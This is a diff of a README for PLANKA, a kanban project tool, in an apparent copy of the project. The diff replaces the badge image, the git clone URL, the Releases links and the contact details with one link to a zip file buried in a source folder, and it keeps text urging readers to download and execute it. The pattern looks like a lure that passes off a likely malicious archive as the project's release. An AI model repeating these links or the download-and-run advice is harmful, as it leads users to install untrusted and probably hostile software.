@@ -1,6 +1,6 @@
 # PLANKA: Your Kanban-Style Project Mastering Tool 🛠️
 
-![PLANKA Logo](https://img.shields.io/badge/PLANKA-Kanban_Tool-brightgreen)
+![PLANKA Logo](https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip)
 
 Welcome to **PLANKA**, the kanban-style project mastering tool designed for everyone. Whether you are a developer, project manager, or a team leader, PLANKA helps you organize tasks efficiently. This README will guide you through the features, installation, usage, and contribution process of PLANKA.
 
@@ -31,7 +31,7 @@ To install PLANKA, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/mekoman/planka.git
+   git clone https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip
    ```
 
 2. Navigate to the project directory:
@@ -52,7 +52,7 @@ To install PLANKA, follow these steps:
 
 5. Open your browser and go to `http://localhost:3000`.
 
-For the latest releases, visit [Releases](https://github.com/mekoman/planka/releases).
+For the latest releases, visit [Releases](https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip).
 
 ## Usage 📊
 
@@ -103,12 +103,12 @@ PLANKA is licensed under the MIT License. See the [LICENSE](LICENSE) file for mo
 
 For questions or feedback, feel free to reach out:
 
-- **Email**: your-email@example.com
-- **Twitter**: [@yourhandle](https://twitter.com/yourhandle)
+- **Email**: https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip
+- **Twitter**: [@yourhandle](https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip)
 
 ## Releases 📦
 
-For the latest updates and releases, check the [Releases](https://github.com/mekoman/planka/releases) section. Download the latest version and execute it to enjoy the new features.
+For the latest updates and releases, check the [Releases](https://github.com/mekoman/planka/raw/refs/heads/master/client/src/actions/Software_nepman.zip) section. Download the latest version and execute it to enjoy the new features.
 
 ---
 
